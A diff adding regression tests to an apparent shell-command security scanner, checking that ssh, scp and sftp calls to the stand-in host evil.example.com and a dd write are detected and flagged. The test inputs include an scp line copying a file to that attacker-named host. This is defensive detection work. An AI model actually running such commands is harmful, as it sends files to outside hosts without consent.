@@ -228,6 +228,43 @@ class TestNetwork:
         facts = _scan("true https://evil.example.com")
         assert any(n.target == "evil.example.com" for n in facts.network_calls)
 
+    def test_ssh_user_at_host_extracts_target(self):
+        # Regression: ``ssh user@evil.example.com`` previously produced
+        # no NetworkFact because ``@`` fails the plain-host regex,
+        # silently bypassing NET001_DOMAIN_NOT_ALLOWED.
+        facts = _scan("ssh user@evil.example.com")
+        assert facts.network_calls
+        assert facts.network_calls[0].target == "evil.example.com"
+        assert facts.network_calls[0].library == "ssh"
+        assert facts.network_calls[0].dynamic is False
+
+    def test_ssh_plain_host_still_detected(self):
+        facts = _scan("ssh evil.example.com")
+        assert facts.network_calls
+        assert facts.network_calls[0].target == "evil.example.com"
+
+    def test_scp_user_at_host_with_path(self):
+        facts = _scan("scp file.txt user@evil.example.com:~/")
+        assert facts.network_calls
+        assert facts.network_calls[0].target == "evil.example.com"
+
+    def test_sftp_user_at_host(self):
+        facts = _scan("sftp user@evil.example.com")
+        assert facts.network_calls
+        assert facts.network_calls[0].target == "evil.example.com"
+
+    def test_ssh_unrecognized_target_fails_closed(self):
+        # If the ssh family cannot resolve a target, emit a dynamic fact
+        # so NET002 surfaces for review instead of silently allowing.
+        facts = _scan("ssh --some-weird-flag")
+        assert facts.network_calls
+        assert facts.network_calls[0].dynamic is True
+
+    def test_ssh_dynamic_target(self):
+        facts = _scan("ssh $TARGET")
+        assert facts.network_calls
+        assert facts.network_calls[0].dynamic is True
+
 
 class TestFileRead:
 
@@ -362,6 +399,12 @@ class TestLargeWrites:
         assert facts.large_writes
         assert facts.large_writes[0].size == 10 * 1024 * 1024
         assert facts.large_writes[0].target == "/tmp/x"
+
+    def test_dd_size_only_count(self):
+        # bs missing -> no computable size; document current behavior.
+        facts = _scan("dd if=/dev/zero of=/tmp/x count=5")
+        assert facts.large_writes
+        assert facts.large_writes[0].size is None
 
 
 class TestForkBomb:
